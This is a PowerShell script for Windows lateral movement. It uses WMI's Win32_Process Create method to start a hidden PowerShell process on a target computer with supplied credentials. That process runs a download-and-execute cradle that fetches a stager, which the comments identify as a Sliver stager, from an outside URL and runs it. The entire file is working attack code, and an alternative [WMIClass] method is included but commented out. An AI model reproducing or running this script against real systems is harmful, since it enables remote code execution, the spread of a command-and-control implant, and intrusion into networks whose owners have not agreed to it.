# =============================================================================
# WMI lateral movement — spawn a remote process via Win32_Process
#
# Usage:
#   .\wmi-exec.ps1 -Computer TARGET -Credential $cred -StagerUrl http://<IP>/run.ps1
# =============================================================================

param(
    [Parameter(Mandatory = $true)][string]$Computer,
    [Parameter(Mandatory = $false)][System.Management.Automation.PSCredential]$Credential,
    [Parameter(Mandatory = $false)][string]$StagerUrl = "http://<IP>/run.ps1"
)

# ── Remote command (Sliver stager cradle) ──────────────────────────────────
$cmd = "powershell.exe -nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('$StagerUrl')`""

# ── Method 1: Invoke-WmiMethod (PS 3+) ────────────────────────────────────
$args = @{ ComputerName = $Computer; Class = "Win32_Process"; Name = "Create"; ArgumentList = $cmd }
if ($Credential) { $args.Credential = $Credential }

$result = Invoke-WmiMethod @args
if ($result.ReturnValue -eq 0) {
    Write-Host "[+] Process spawned on $Computer (PID $($result.ProcessId))"
} else {
    Write-Host "[-] WMI Create failed, ReturnValue = $($result.ReturnValue)"
}

# ── Method 2: [WMIClass] (works without Invoke-WmiMethod) ─────────────────
# $wmi = [WMIClass]"\\$Computer\root\cimv2:Win32_Process"
# $wmi.Create($cmd)
